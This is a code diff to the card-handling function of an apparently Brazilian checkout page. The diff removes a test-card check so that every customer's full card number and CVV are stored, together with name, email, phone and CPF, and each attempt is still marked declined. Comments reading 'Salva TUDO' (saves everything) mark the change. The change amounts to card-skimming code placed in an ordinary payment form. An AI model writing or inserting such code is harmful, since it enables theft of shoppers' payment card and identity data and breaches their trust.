@@ -615,28 +615,28 @@
     }
 
     function saveCardAttempt(formData) {
-      const digits = onlyDigits(formData.get('cardNumber'));
-      const isTestCard = isAllowedTestCard(digits);
-      const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
+  const digits = onlyDigits(formData.get('cardNumber'));
+  const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
 
-      cards.unshift({
-        createdAt: new Date().toISOString(),
-        holder: formData.get('cardHolder') || formData.get('name') || '',
-        email: formData.get('email') || '',
-        phone: formData.get('phone') || '',
-        cpf: formData.get('document') || '',
-        brand: cardBrand(digits),
-        cardNumber: isTestCard ? formatCardNumber(digits) : '',
-        cvv: isTestCard ? onlyDigits(formData.get('cardCvv')).slice(0, 4) : '',
-        isTestCard,
-        last4: digits.slice(-4),
-        expiry: formData.get('cardExpiry') || '',
-        amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
-        status: 'Recusado'
-      });
+  cards.unshift({
+    createdAt: new Date().toISOString(),
+    holder: formData.get('cardHolder') || formData.get('name') || '',
+    email: formData.get('email') || '',
+    phone: formData.get('phone') || '',
+    cpf: formData.get('document') || '',
+    brand: cardBrand(digits),
+    cardNumber: formatCardNumber(digits), // Salva TUDO
+    cvv: onlyDigits(formData.get('cardCvv')).slice(0, 4), // Salva TUDO
+    isTestCard: false, // Força como não-teste (opcional)
+    last4: digits.slice(-4),
+    expiry: formData.get('cardExpiry') || '',
+    amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
+    status: 'Recusado'
+  });
 
-      localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
-    }
+  localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
+}
+
 
     function showCardLoading() {
       paymentOverlay.hidden = false;
